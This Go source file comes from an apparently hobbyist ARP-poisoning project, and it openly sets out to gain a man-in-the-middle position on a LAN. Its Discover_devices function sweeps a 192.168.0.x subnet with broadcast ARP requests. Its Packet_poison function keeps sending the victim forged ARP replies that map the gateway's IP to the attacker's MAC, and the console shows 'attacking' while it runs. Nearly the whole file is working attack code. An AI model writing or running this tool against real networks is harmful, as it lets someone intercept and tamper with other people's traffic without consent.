// SPDX-License-Identifier: MIT
// Copyright (c) 2025 Pythonic01
package captureArp

import (
	"arp_poision/shared"
	"fmt"
	"log"
	"net"
	"time"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// TODO: make a packet sender
// NOTE: So we just need to send arp replay to all devices in the LAN inorder to get mitm
//
//	NOTE: So there is a type of arp messages that sent to all clients called Gratuitous which \
//	      is using the ethernet layer dest mac address as broadcast address (ff:ff:ff:ff:ff:ff) \
//	      to send the arp message to all client. Also the target mac in the arp message is broadcast too.
var (
	buffer gopacket.SerializableLayer
	option gopacket.SerializableLayer
)

func craft_ip(attackerIp net.IP, destIp net.IP) *layers.IPv4 {
	ip := &layers.IPv4 {
		SrcIP: attackerIp,
		DstIP: destIp,
		Protocol: layers.IPProtocolICMPv4,

	}
	return ip;
}

//TODO: implement icmp host discovery
func craft_icmp() *layers.ICMPv4{
	icmp := &layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0), 
        Id:       0x1234,
		Seq: 0,
	}
	return icmp;
}

func craft_arp(attackerMac net.HardwareAddr, targeMac net.HardwareAddr, getwayIp net.IP, targetIp net.IP, op uint16) *layers.ARP {
	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         op,
		SourceHwAddress:   attackerMac, // Attacker mac
		SourceProtAddress: getwayIp,
		DstHwAddress:      targeMac, // target
		DstProtAddress:    targetIp,
	}
	return arp
}

func craft_ethernet(targetHard net.HardwareAddr, attackerHard net.HardwareAddr) *layers.Ethernet {
	ether := &layers.Ethernet{
		EthernetType: layers.EthernetTypeARP,
		SrcMAC:       attackerHard,
		DstMAC:       targetHard,
	}
	return ether
}

func Discover_devices(handler *pcap.Handle, attackerMac net.HardwareAddr, attackerIp net.IP, ch chan string){
	// prepare packet variables
	buffer := gopacket.NewSerializeBuffer()
	broadcast_mac_eth, err := net.ParseMAC("ff:ff:ff:ff:ff:ff");
	if err != nil {
		log.Fatal("parse Ethe mac ", err);
	}
	spin := []rune{'|', '/', '-', '\\'} // classic terminal hacker look

	// carft arp header
	eth := craft_ethernet(broadcast_mac_eth, attackerMac)
	broadcast_mac_arp, err := 	net.ParseMAC("00:00:00:00:00:00");
	if err != nil {
		log.Fatal("Error parsing target mac in discovery ", err);
	}

	spinIndex := 0
	// TODO: FIX THIS
	ip := "192.168.0.";
	
	for i := 1; i < 256 ; i++{

		fullIP := fmt.Sprintf("%s%d", ip, i);
		arp := craft_arp(attackerMac, broadcast_mac_arp, attackerIp, net.ParseIP(fullIP).To4(), layers.ARPRequest)
		opt := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		err = gopacket.SerializeLayers(buffer, opt, eth, arp)
		if err != nil {
	
			log.Fatal("Error serilize the packet ", err)
		}
		err = handler.WritePacketData(buffer.Bytes())
		if err != nil {
			log.Fatal("Error serilize the packet HELLO ", err)
		}
		fmt.Printf("\r[%c] Scanning %s", spin[spinIndex%len(spin)], fullIP)
		spinIndex++
		time.Sleep(200 * time.Millisecond)
	}
	ch <- "done";
}

func Packet_poison(handler *pcap.Handle, args shared.ParsedCommandLine) {
	// initiating variables
	buffer := gopacket.NewSerializeBuffer()
	eth := craft_ethernet(args.VictimMAC, args.AttackerMAC)
	spin := []rune{'|', '/', '-', '\\'} // classic terminal hacker look
	
	// craft the arp request
	arp := craft_arp(args.AttackerMAC, args.VictimMAC, args.DefaultGateway, args.VictimIP, layers.ARPReply)
	
	// prepare packet and send
	spinIndex := 0;
	opt := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := gopacket.SerializeLayers(buffer, opt, eth, arp)
	if err != nil {
		log.Fatal("Error serilize the packet ", err)
	}

	for {
		err = handler.WritePacketData(buffer.Bytes())
		if err != nil {
			log.Fatal("Error serilize the packet ", err)
		}

		fmt.Printf("\r[%c] attacking", spin[spinIndex%len(spin)])
		spinIndex++
		time.Sleep(2 * time.Second);
	}

}
